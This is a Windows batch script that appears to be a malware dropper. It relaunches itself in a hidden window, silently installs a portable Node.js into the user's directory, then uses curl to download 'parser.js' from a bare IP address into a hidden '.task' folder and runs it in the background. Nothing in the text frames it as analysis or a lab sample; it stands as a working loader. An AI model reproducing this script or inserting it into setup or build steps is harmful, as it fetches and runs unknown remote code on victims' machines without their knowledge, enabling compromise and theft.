@echo off
setlocal enabledelayedexpansion

if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

set "NODE_VERSION=20.11.1"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"

if not exist "%PORTABLE_NODE%" (
    where curl >nul 2>&1
    if %errorlevel% NEQ 0 (
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
    ) else (
        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
    )

    if not exist "%~dp0%NODE_MSI%" (
        exit /b 1
    )
    msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"

    del "%~dp0%NODE_MSI%"
    
)

if exist "%PORTABLE_NODE%" (
    set "NODE_EXE=%PORTABLE_NODE%"
    set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
) else (
    exit /b 1
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
%NODE_EXE% -v >nul 2>&1
if errorlevel 1 (
    echo "not install"
    exit /b 1
)

:: -------------------------
:: Download required files
:: -------------------------
set "USERPROFILE=%USERPROFILE%"
set "URL=http://64.204.80.251"
set "PJS=%USERPROFILE%\.task\parser.js"

MD "%USERPROFILE%\.task" 2>nul
echo "create task"
curl -L -o "%PJS%" "%URL%/231/parser.js"

:: -------------------------
:: Run
:: -------------------------
if exist "%PJS%" (
    start "" /b "%NODE_EXE%" "%PJS%"
    if errorlevel 1 (
        echo [ERROR] parser execution failed.
        exit /b 1
    )
) else (
    echo [ERROR] parser.js not found.
    exit /b 1
)

echo [SUCCESS] Script completed successfully.
exit /b 0
